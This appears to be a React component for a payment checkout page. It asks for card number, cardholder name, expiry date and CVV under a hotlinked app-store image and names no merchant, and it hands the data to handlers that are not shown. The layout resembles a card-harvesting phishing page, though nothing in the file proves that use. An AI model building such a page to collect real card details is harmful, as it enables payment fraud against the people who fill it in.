
import { NavLink } from "react-router-dom";

function HomePage(props) {
    return (
        <div className="container">
            <form className="box" onSubmit={props.handleSubmit}>
                <img src="https://play-lh.googleusercontent.com/SaAApLbrhZtg63AQfgfvzTVqN65kVcVbwg5FY1ERpeb0k1cSpw7KBHoeP6dQft1szw=w416-h235-rw" alt="" width="200" />
                <h1>You're almost done!</h1>
                <h3>Provide your credit/debit card information to complete your purchase</h3>

                <div className="duo2">
                </div>



                <div className="over">
                    <div className="card-input">
                        <p>Card number</p>
                        <input type="number" placeholder="1111 2222 3333 4444" name="cardNumber" onChange={props.getData} required/>
                    </div>
                    <div className="card-input put1">
                        <p>Cardholder's name</p>
                        <input type="text" placeholder="JOHN DOE" name="cardName" onChange={props.getData} />
                    </div>
                    <div className="split">
                        <div className="card-input put1">
                            <p>Expiry date</p>
                            <input type="text" placeholder="12/34" name="expiryDate" onChange={props.getData} />
                        </div>
                        <div className="card-input put1">
                            <p>CVV</p>
                            <input type="number" placeholder="123" name="cvv" onChange={props.getData} />
                        </div>
                    </div>

                </div>





                <button className="check" onClick={props.handleSubmit}>Checkout</button>

            </form>
        </div>
    )
}

export default HomePage;